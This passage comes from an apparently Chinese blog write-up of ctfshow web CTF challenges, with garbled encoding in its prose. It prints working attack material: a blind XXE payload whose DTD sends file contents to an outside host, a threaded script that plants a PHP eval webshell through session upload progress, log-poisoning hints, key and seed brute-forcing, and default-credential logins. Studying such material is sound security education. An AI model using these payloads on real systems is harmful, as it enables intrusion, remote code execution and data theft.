plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: openssl_decrypt() expects parameter 1 to be string, array given in &#x2F;var&#x2F;www&#x2F;html&#x2F;showImage.php on line 8</span><br></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®<code>showImage.php</code>ä¼šæœ‰æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$key = substr(md5(&#x27;ctfshow&#x27;.rand()),3,8);</span></span><br><span class="line"><span class="comment">//flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;image&#x27;</span>]))&#123;</span><br><span class="line">    $image=$_GET[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">&#x27;bf-ecb&#x27;</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($str))&#123;</span><br><span class="line">        header(<span class="string">&#x27;content-type:image/gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>çˆ†ç ´keyå§ï¼Œè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$image &#x3D; &quot;Z6Ilu83MIDw&#x3D;&quot;;</span><br><span class="line">for($i&#x3D;0;$i&lt;100000;$i++)&#123;</span><br><span class="line">    $key &#x3D; substr(md5(&#39;ctfshow&#39;.$i),3,8);</span><br><span class="line">    $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key);</span><br><span class="line">    if(strpos($str,&#39;jpg&#39;)||strpos($str,&#39;png&#39;)||strpos($str,&#39;gif&#39;))&#123;</span><br><span class="line">        echo &#39;key:&#39;.$key;</span><br><span class="line">        echo &quot;\nrand():&quot;.$i;</span><br><span class="line">        $a &#x3D; openssl_encrypt(&quot;config.php&quot;,&quot;bf-ecb&quot;,$key);</span><br><span class="line">        echo &quot;\nanser:&quot;.$a;</span><br><span class="line">        echo &quot;\nfile:&quot;.$str;</span><br><span class="line">        break;      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web4è§‚å¿ƒWEB-AKèµ›"><a href="#web4è§‚å¿ƒWEB-AKèµ›" class="headerlink" title="web4è§‚å¿ƒWEB_AKèµ›"></a>web4è§‚å¿ƒWEB_AKèµ›</h3><p>åœ¨<code>js/common.js</code>é‡Œçœ‹åˆ°<code>api.php</code>ï¼Œå åœæŠ“åŒ…å‘ç°</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200928230754.png"></p><p>è²Œä¼¼æ˜¯xxe,æ— å›æ˜¾çš„ï¼ŒçŒœæµ‹ç›´æ¥ç”¨<code>file_get_contents</code>å¾—åˆ°xmlæ–‡ä»¶çš„</p><p>æœåŠ¡ç«¯çš„xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://1.1.1.1/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p><code>test.dtd</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;1.1.1.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="ç­¾åˆ°è§‚å·±WEB-AKèµ›"><a href="#ç­¾åˆ°è§‚å·±WEB-AKèµ›" class="headerlink" title="ç­¾åˆ°è§‚å·±WEB_AKèµ›"></a>ç­¾åˆ°è§‚å·±WEB_AKèµ›</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php/i&#x27;</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥åŒ…å«ä¸Šä¼ è¿›åº¦è¿›åº¦å°±è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://87938f25-72e4-4941-a5a5-c9bbdf65dbe6.chall.ctf.show/&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=mb&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    files=&#123;</span><br><span class="line">        <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                                   <span class="comment">#ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27;</span>     <span class="comment">#æ¶æ„è¿›åº¦ä¿¡æ¯ï¼Œreadfileå°†ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url,files=files,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="comment"># event.wait()</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        POST()</span><br><span class="line">        t=r.get(<span class="string">&quot;http://87938f25-72e4-4941-a5a5-c9bbdf65dbe6.chall.ctf.show/?file=/tmp/sess_mb&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">&#x27;[+] success&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><p>æˆ–è€…åŒ…å«æ—¥å¿—:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</span><br></pre></td></tr></table></figure><p>å…ˆåŒ…å«æ—¥å¿—é…ç½®æ–‡ä»¶æŸ¥çœ‹logæ–‡ä»¶ä½ç½®ï¼Œåªéœ€åœ¨user-agentä¸­åŠ å…¥ä¸€å¥è¯å°±è¡Œ</p><h2 id="webå…¥é—¨"><a href="#webå…¥é—¨" class="headerlink" title="webå…¥é—¨"></a>webå…¥é—¨</h2><h3 id="web11-1"><a href="#web11-1" class="headerlink" title="web11"></a>web11</h3><p>æç¤ºåŸŸåä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œç«‹é©¬æƒ³åˆ°äº†txtè®°å½•ï¼Œç›´æ¥<code>nslookup</code></p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200906224511.png"></p><h3 id="web12-1"><a href="#web12-1" class="headerlink" title="web12"></a>web12</h3><p>æç¤ºé¡µé¢ä¸­çš„ä¿¡æ¯æ˜¯å¯†ç ï¼Œå‘ç°æœ‰ä¸ªæ‰‹æœºå·ï¼Œå¯†ç åˆšå¥½ä¸ºè¿™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:372619038</span><br></pre></td></tr></table></figure><h3 id="web13-1"><a href="#web13-1" class="headerlink" title="web13"></a>web13</h3><p>æŸ¥çœ‹æºç å‘ç°<code>document.pdf</code>ï¼Œä¸‹è½½ä¸‹æ¥æ‰¾åˆ°åå°ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;system1103&#x2F;login.php</span><br><span class="line">é»˜è®¤è´¦å·å¯†ç ï¼šadmin:admin1103</span><br></pre></td></tr></table></figure><h3 id="web14-1"><a href="#web14-1" class="headerlink" title="web14"></a>web14</h3><p>æŸ¥çœ‹æºç å‘ç°<code>/editor/</code>è·¯å¾„ï¼Œè®¿é—®æŸ¥çœ‹æºç å‘ç°æ˜¯KindEditorï¼Œç›´æ¥åœ¨æ–‡ä»¶ç©ºé—´æ‰¾åˆ°flagçš„è·¯å¾„ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;nothinghere&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>ç¤¾å·¥é¢˜ï¼Œé¦–é¡µæš´éœ²çš„é‚®ç®±æœäº†ä¸‹qqå‘ç°å±…ä½é™•è¥¿è¥¿å®‰ï¼Œ<code>/admin</code>æˆåŠŸé€šè¿‡å¯†ä¿é—®é¢˜é‡ç½®å¯†ç </p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>æç¤ºæ¢é’ˆï¼Œè®¿é—®<code>tz.php</code>ï¼Œåœ¨phpinfoä¸­æ‰¾åˆ°flag</p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>ç½‘ç»œç©ºé—´æœç´¢å¼•æ“å°±è¡Œï¼Œzoomeyeç›´æ¥æŸ¥</p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°jsä¸­æœ‰è°éŸ³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>110.php</code>å¾—åˆ°flag</p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p>æŸ¥çœ‹æºç å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag=<span class="string">&quot;fakeflag&quot;</span>;</span><br><span class="line">$u = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$p = $_POST[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($u) &amp;&amp; <span class="keyword">isset</span>($p))&#123;</span><br><span class="line">    <span class="keyword">if</span>($u===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $p ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”å‘ç°åŠ å¯†æ–¹å¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="string">&quot;0000000372619038&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> iv = <span class="string">&quot;ilove36dverymuch&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> pazzword = $(<span class="string">&quot;#pazzword&quot;</span>).val();</span><br><span class="line">        pazzword = encrypt(pazzword,key,iv);</span><br><span class="line">        $(<span class="string">&quot;#pazzword&quot;</span>).val(pazzword);</span><br><span class="line">        $(<span class="string">&quot;#loginForm&quot;</span>).submit();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">data,key,iv</span>) </span>&#123; <span class="comment">//key,ivï¼š16ä½çš„å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">var</span> key1  = CryptoJS.enc.Latin1.parse(key);</span><br><span class="line">        <span class="keyword">var</span> iv1   = CryptoJS.enc.Latin1.parse(iv);</span><br><span class="line">        <span class="keyword">return</span> CryptoJS.AES.encrypt(data, key1,&#123;</span><br><span class="line">            iv : iv1,</span><br><span class="line">            mode : CryptoJS.mode.CBC,</span><br><span class="line">            padding : CryptoJS.pad.ZeroPadding</span><br><span class="line">        &#125;).toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>aesåŠ å¯†ï¼Œç›´æ¥ç”¨<code>CyberChef</code>è§£ï¼Œåé¢çš„ç‚¹æ˜¯å¤šä½™çš„ï¼Œå³å¯†ç ä¸º<code>i_want_a_36d_girl</code></p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200907115829.png"></p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>å¾¡å‰‘æ‰«ç›®å½•å‘ç°æœ‰<code>/db</code>ï¼Œæ‰‹æµ‹<code>/db/db.mdb</code>å­˜åœ¨ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œ16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼Œæœç´¢flag</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200907122023.png"></p><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>ç»™çš„æœ‰å­å…¸ï¼ŒæŠ“åŒ…ï¼Œå‘ç°ç»è¿‡äº†ä¸€å±‚base64åŠ å¯†ï¼Œæ²¡äº‹ï¼Œburpsuiteå¯ä»¥è§£å†³</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200907122700.png"></p><p>å¥½åƒä¸èƒ½urlç¼–ç ï¼Œæœ€ç»ˆè·‘å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:shark63</span><br></pre></td></tr></table></figure><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>å­åŸŸåçˆ†ç ´ï¼Œç›²çŒœ<code>flag.ctfer.com</code></p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    $token = md5($_GET[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çˆ†ç ´ï¼Œå¯ä»¥çŸ¥é“ï¼Œç¬¬2ä½ï¼Œç¬¬15ä½ï¼Œç¬¬18ä½æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”ä¸ºæ•°å­—ï¼Œç¬¬32ä½ä¸º3ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000000000000000</span>):</span><br><span class="line">    s = hashlib.md5(str(i).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>]==s[<span class="number">14</span>] <span class="keyword">and</span> s[<span class="number">14</span>]==s[<span class="number">17</span>] <span class="keyword">and</span> s[<span class="number">31</span>].isdigit() <span class="keyword">and</span> s[<span class="number">31</span>]==<span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        print(i,s)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ªéšæœºæ•°ï¼Œç‰ˆæœ¬æ˜¯php7</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="comment">// 1155388967</span></span><br></pre></td></tr></table></figure><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!$rand))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥php_mt_seedçˆ†ç ´ç§å­ï¼Œç›´æ¥çˆ†ç ´çš„è¯éœ€è¦<code>36*36*36</code>æ¬¡ï¼Œä¸Šä¸‡äº†ï¼Œä¸å¤ªç°å®ï¼Œæ³¨æ„<code>mt_rand()</code>çš„æ¬¡æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">117235642</span>);</span><br><span class="line">mt_rand();</span><br><span class="line"><span class="keyword">echo</span> (mt_rand()+mt_rand());</span><br></pre></td></tr></table></figure><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p>å°±çˆ†ç ´å®Œäº‹äº†ï¼Œå¯†ç ï¼š<code>7758521</code></p><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>å½•å–åå•ä¸‹è½½ä¸‹æ¥<code>list.xlsx</code>ï¼Œé‡Œé¢æœ‰å­¦ç”Ÿçš„ä¿¡æ¯ï¼Œæœäº†ä¸‹åå­—ï¼Œæ‰¾åˆ°ï¼š<a href="https://tools.aizhan.com/rb/idcard.ifanyi.com.cn">https://tools.aizhan.com/rb/idcard.ifanyi.com.cn</a></p><p>å…¶å®çˆ†ç ´ä¹Ÿè¡Œï¼Œç¼ºå¤±çš„éƒ¨åˆ†æ˜¯äººçš„ç”Ÿæ—¥</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://3a5c5c7a-84c9-485d-8a71-822803a153ff.chall.ctf.show/info/checkdb.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;å§“å&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;p&quot;</span> <span class="attr">name</span>=<span class="string">&quot;p&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;èº«ä»½è¯å·ç &quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> 